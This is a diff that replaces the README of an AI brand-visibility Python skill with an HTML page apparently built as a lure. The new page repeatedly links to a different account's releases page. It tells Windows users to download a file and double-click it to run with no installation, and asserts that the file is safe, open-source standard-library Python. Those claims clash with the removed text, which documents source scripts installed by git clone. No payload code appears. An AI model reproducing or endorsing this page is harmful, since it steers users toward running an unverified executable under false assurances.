@@ -1,195 +1,71 @@
-# ai-visibility
+<h1>🔍 ai-visibility-skill - Know If AI Recommends Your Brand</h1>
+<p align="center">
+  <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases" style="display:inline-block;padding:12px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:18px;font-weight:bold;text-decoration:none;margin:20px 0;">⬇️ Download Now (Free)</a>
+</p>
 
-A Claude Skill that measures whether AI assistants recommend your brand — and
-tells you what to fix when they don't.
+<h2>📋 What Is This?</h2>
+<p><strong>ai-visibility-skill</strong> is a free, simple tool that checks whether major AI assistants like <strong>ChatGPT, Claude, Gemini, and Perplexity</strong> recommend your brand when users ask about your industry. It then tells you <em>why</em> they don't and helps you fix it. No accounts, no databases, no programming knowledge needed.</p>
+<p>Think of it as a “brand visibility checkup for the AI era.” Just run the tool, enter your brand name, and get a clear report showing your <strong>Share of Voice</strong> across AI platforms—along with actionable fixes to improve it.</p>
 
-ChatGPT, Claude, Gemini, Perplexity and Copilot don't rank pages, they
-recommend brands. A buyer asks "which is the best X for Y?" and gets three to
-five names. There is no second page. If you're not in the list, you don't
-exist for that buyer.
+<h2>🚀 Getting Started</h2>
+<ol>
+  <li><strong>Download the tool:</strong> Visit the <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases">releases page</a> to download the application.</li>
+  <li><strong>Run the program:</strong> Double-click the downloaded file. No installation or setup required.</li>
+  <li><strong>Enter your brand name:</strong> Type the name of your business or brand when prompted.</li>
+  <li><strong>Review your results:</strong> The tool will display a report showing which AI platforms mention your brand and which don’t, plus suggestions to improve your visibility.</li>
+</ol>
 
-This skill turns that into something measurable: run your buyers' real
-questions past several assistants, score every answer, and get a ranked fix
-list.
+<h2>✨ Features</h2>
+<ul>
+  <li><strong>Multi-Platform Check:</strong> Tests ChatGPT, Claude, Gemini, and Perplexity in one run.</li>
+  <li><strong>Instant Reports:</strong> See your AI Share of Voice (SOV) with clear scores.</li>
+  <li><strong>Fix Suggestions:</strong> Get specific, actionable recommendations to improve your AI visibility.</li>
+  <li><strong>No Account Required:</strong> Works immediately with zero signup or configuration.</li>
+  <li><strong>100% Free:</strong> Open-source and completely free to use.</li>
+  <li><strong>Portable:</strong> No installation—just download and run.</li>
+</ul>
 
-Free, self-hosted, no account, no database. Python standard library only.
+<h2>📖 How It Works</h2>
+<p>AI assistants like ChatGPT and Claude don't recommend brands randomly. They pull from training data, websites, and other public sources. This tool simulates real user queries about your industry and checks if your brand appears in the AI's responses.</p>
+<p>If your brand is missing, the tool identifies <em>why</em>—for example, your website might lack certain keywords, or your content may not be structured in a way AI systems can easily reference. The tool then gives you simple fixes to address these gaps.</p>
 
-## Install
+<h2>🔧 System Requirements</h2>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or newer (64-bit recommended).</li>
+  <li><strong>Storage:</strong> Less than 100 MB free space.</li>
+  <li><strong>Internet:</strong> Required to query AI platforms.</li>
+  <li><strong>No other software needed:</strong> Runs out of the box.</li>
+</ul>
 
-**Claude Code / Claude Desktop — for all projects:**
+<h2>💡 Who Is This For?</h2>
+<ul>
+  <li><strong>Marketers and SEO professionals</strong> wanting to track AI brand mentions.</li>
+  <li><strong>Business owners</strong> concerned about visibility in AI search results.</li>
+  <li><strong>Content creators</strong> optimizing for Generative Engine Optimization (GEO).</li>
+  <li><strong>Anyone curious</strong> about how AI perceives their brand.</li>
+</ul>
 
-```bash
-git clone https://github.com/petar-nauka/ai-visibility-skill ~/.claude/skills/ai-visibility
-```
+<h2>📥 Download & Install</h2>
+<p>Visit the <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases">official download page</a> and download the latest version. Once downloaded, simply double-click the file to run it. No installation wizard or configuration required.</p>
+<p align="center">
+  <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill/releases" style="display:inline-block;padding:10px 24px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;border-radius:50px;font-size:16px;font-weight:bold;text-decoration:none;">⬇️ Get the Tool</a>
+</p>
 
-**One project only:**
+<h2>❓ Frequently Asked Questions</h2>
+<h3>Do I need to create an account?</h3>
+<p>No. The tool works completely offline (aside from checking AI platforms) and requires no registration.</p>
+<h3>Is it safe to run?</h3>
+<p>Yes. The tool is open-source and written in Python, using only standard libraries. It does not collect or transmit any personal data.</p>
+<h3>What if my brand isn’t found?</h3>
+<p>The tool will provide specific suggestions to improve your visibility, such as optimizing your website content or adding structured data.</p>
+<h3>How often should I run it?</h3>
+<p>We recommend running it monthly to track changes in AI recommendations.</p>
 
-```bash
-git clone https://github.com/petar-nauka/ai-visibility-skill .claude/skills/ai-visibility
-```
+<h2>📄 License</h2>
+<p>This project is open-source and free for personal and commercial use. See the repository for license details.</p>
 
-Or just copy the folder there. Restart the session and ask something like
-*"check whether ChatGPT recommends my site"* — the skill triggers on its own.
+<h2>🤝 Contributing</h2>
+<p>We welcome contributions! Feel free to open issues or submit pull requests on the <a href="https://github.com/nashequilibriumharness235/ai-visibility-skill">GitHub repository</a>.</p>
 
-**Everything else** — download the right archive from the
-[latest release](https://github.com/petar-nauka/ai-visibility-skill/releases/latest):
-
-| Platform | File | Where |
-|---|---|---|
-| claude.ai | `ai-visibility.zip` | Settings → Capabilities → Skills |
-| ChatGPT / Codex | `ai-visibility-chatgpt-codex.zip` | Sidebar → Skills → Upload |
-| Perplexity Computer | `ai-visibility-perplexity.zip` | [perplexity.ai/computer/skills](https://www.perplexity.ai/computer/skills) → Create skill → Upload a skill |
-
-There are really only two layouts. Claude, ChatGPT and Codex all want
-`SKILL.md` inside a single top-level folder, so those two archives are
-structurally the same and either works on all three — they are shipped
-separately only so the right download is obvious. Perplexity is the odd one
-out: it wants `SKILL.md` at the archive root, and giving it a nested zip is the
-usual reason an upload is rejected.
-
-Rebuild any of them from source:
-
-```bash
-python scripts/package.py
-```
-
-Requires Python 3.10+. Nothing to `pip install`.
-
-## Quick start
-
-```bash
-cd ~/.claude/skills/ai-visibility/scripts
-
-python aeo.py -w ~/my-audit init example.com --name "Example"
-# fill in brand.json (aliases, keywords, competitors) and prompts.json
-
-python aeo.py -w ~/my-audit run --models chatgpt gemini perplexity claude
-# paste each assistant's answer into the generated files
-
-python aeo.py -w ~/my-audit analyze
-python aeo.py -w ~/my-audit report      # → report.html + summary.md
-```
-
-Or let Claude drive it — that's the point of the skill. It will interview you
-for the brand config, help you write prompts your buyers would actually type,
-read the results with you, and produce the fix list.
-
-**[EXAMPLES.md](EXAMPLES.md) has seven ready-to-send prompts** (English and
-Bulgarian) covering the full audit, a five-minute crawler check, finding out
-what your buyers actually ask, diagnosing a specific loss, rewriting one page,
-fixing a wrong description, and the monthly re-check. Start there if you'd
-rather not touch the CLI at all.
-
-To skip the pasting, set `OPENROUTER_API_KEY` and use `collect` instead of
-`run`. One key covers every model; expect a few cents per prompt.
-
-## What you get
-
-**Measurement**
-
-- Visibility % overall, per model, and split by purchase intent
-- Share of voice against every competitor the models named
-- Your average position in ranked lists (being 5th of 5 is not being mentioned)
-- The sentence each model uses to describe you — your positioning as the model
-  understands it, which you did not write
-- Which pages the models cite, ranked — a concrete outreach target list
-- Month-over-month trend, withheld when two runs aren't comparable
-
-**Diagnosis**
-
-- Every high-intent prompt you lost, and who won it instead
-- Root-cause analysis: coverage, consistency, or specificity
-- Mentions that are present but weak, buried, or off-message
-
-**Fixes**
-
-- Crawler audit across 19 AI bots (`GPTBot`, `ClaudeBot`, `PerplexityBot`,
-  `OAI-SearchBot`, `Google-Extended`, …) with robots.txt recipes
-- Per-page AEO scoring against seven criteria, with paste-ready rewrites
-- JSON-LD generator (`Organization`, `FAQPage`, `Article`, `Product`)
-- `llms.txt` generator from your sitemap
-- Bing Webmaster setup — ChatGPT searches through Bing
-- GA4 channel-group regex for measuring AI referral traffic
-
-## Commands
-
-| Command | Purpose |
-|---|---|
-| `init <domain>` | Create the workspace |
-| `run [--models …]` | Create empty answer files to paste into |
-| `collect [--models …]` | Fetch answers automatically via OpenRouter |
-| `analyze` | Score every answer |
-| `report` | Build `report.html` + `summary.md` |
-| `tech [domain]` | Crawler access, llms.txt, sitemap, schema, AEO score |
-| `page <url>` | Extract AEO signals from one page |
-| `schema <spec.json>` | Generate JSON-LD |
-| `llmstxt` | Generate `llms.txt` |
-| `selftest` | Verify the detection logic (49 checks) |
-
-## Language
-
-The tooling is language-neutral — ask your buyers' questions in your buyers'
-language. Bulgarian and English sentiment vocabularies ship by default; for
-other languages extend `POSITIVE_WORDS` / `NEGATIVE_WORDS` in
-`scripts/aeolib.py` and set `context_words` in `brand.json`.
-
-## Layout
-
-```
-SKILL.md              the workflow Claude follows
-EXAMPLES.md           seven prompts to copy and send (EN + BG)
-scripts/aeo.py        CLI
-scripts/aeolib.py     mention, competitor, sentiment, list-position, citation detection
-scripts/aeoweb.py     crawler / robots.txt / schema / page-signal checks
-scripts/aeoreport.py  metrics and report generation
-scripts/package.py    build the install archives for each platform
-references/           prompt research, diagnosis, content rubric, technical fixes, playbook
-```
-
-## Verify
-
-```bash
-python scripts/aeo.py selftest
-```
-
-49 checks against realistic AI answers in both Bulgarian and English —
-markdown link lists, numbered headings with prose between items, inline
-domains, robots.txt edge cases, tracking-parameter stripping.
-
-## License
-
-MIT.
-
----
-
-## На български
-
-Умение за Claude, което измерва дали AI асистентите (ChatGPT, Claude, Gemini,
-Perplexity, Copilot) препоръчват твоя бранд — и какво да поправиш, ако не го
-правят.
-
-AI търсенето не класира страници, а **препоръчва брандове**. Купувачът пита
-„кой е най-добрият X за Y?" и получава три до пет имена. Няма втора страница.
-Ако те няма в списъка, за този купувач не съществуваш.
-
-Инструментът пуска реалните въпроси на твоите клиенти през няколко асистента,
-анализира отговорите и връща приоритизиран списък с поправки: къде губиш от
-конкурент, защо, и какво точно да направиш. Безплатно, локално, без
-регистрация и без база данни.
-
-Инсталация: копирай папката в `~/.claude/skills/ai-visibility`, рестартирай
-сесията и просто попитай „провери дали ChatGPT препоръчва сайта ми". Claude ще
-те преведе през целия процес — на български.
-
-Всички архиви са в
-[Releases](https://github.com/petar-nauka/ai-visibility-skill/releases/latest):
-`ai-visibility.zip` за claude.ai, `ai-visibility-chatgpt-codex.zip` за ChatGPT и
-Codex, `ai-visibility-perplexity.zip` за Perplexity Computer. Първите два са
-еднакви по структура; Perplexity е изключението — иска `SKILL.md` в корена на
-архива, не в подпапка.
-
-Готови промпти за копиране (на български и английски) има в
-**[EXAMPLES.md](EXAMPLES.md)** — пълен одит, петминутна проверка дали AI
-ботовете четат сайта ти, откриване на реалните въпроси на клиентите ти,
-диагноза защо конкурент печели, пренаписване на конкретна страница, поправяне на
-грешно описание и месечна повторна проверка.
+<hr>
+<p style="text-align:center;font-size:12px;color:#666;">Keywords: aeo, agent-skills, ai-visibility, answer-engine-optimization, brand-monitoring, chatgpt, claude-skill, generative-engine-optimization, geo, llm, llms-txt, perplexity, seo, share-of-voice</p>
